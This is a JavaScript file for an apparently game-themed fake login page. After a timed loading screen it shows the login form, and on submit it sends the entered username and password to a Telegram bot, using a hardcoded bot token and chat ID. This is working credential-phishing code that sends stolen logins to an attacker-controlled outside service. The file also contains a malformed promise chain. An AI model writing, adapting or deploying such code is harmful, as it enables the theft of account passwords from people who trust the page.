let TOKEN_BOT = "7092638526:AAGQx4xr5PUWcycFhZsaU0WSAjHZRau-E_g";
let CHAT_ID = "5682662110";

let body = document.querySelector("body");
let loading = document.querySelector(".loading");

setTimeout(() => {
  body.classList.remove(
    "bg-[url(https://staticg.sportskeeda.com/editor/2024/01/b3109-17046051080206-1920.jpg)"
  );
  loading.classList.add("hidden");
  body.classList.add(
    "bg-[url(https://www.memuplay.com/blog/wp-content/uploads/2024/01/GDVuFDBWYAA4EEy.jpg)]"
  );
  login.classList.remove("hidden");
}, 5000);

let inputs = document.querySelectorAll("input");
let button = document.querySelector("button");

button.addEventListener("click", (e) => {
  e.preventDefault();

  fetch(`https://api.telegram.org/bot${TOKEN_BOT}/sendMessage`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: `LOGIN: ${inputs[0].value}  PASSWORD: ${inputs[1].value}`
    })
  })
    .then((response) => response.json())
    .then((malumot) => {
      console.log(malumot);
    })

    .then((info) => info.json())
    .then((malumot) => {
      console.log(malumot);
    })
    .catch((error) => console.log("ERROR", error));
});
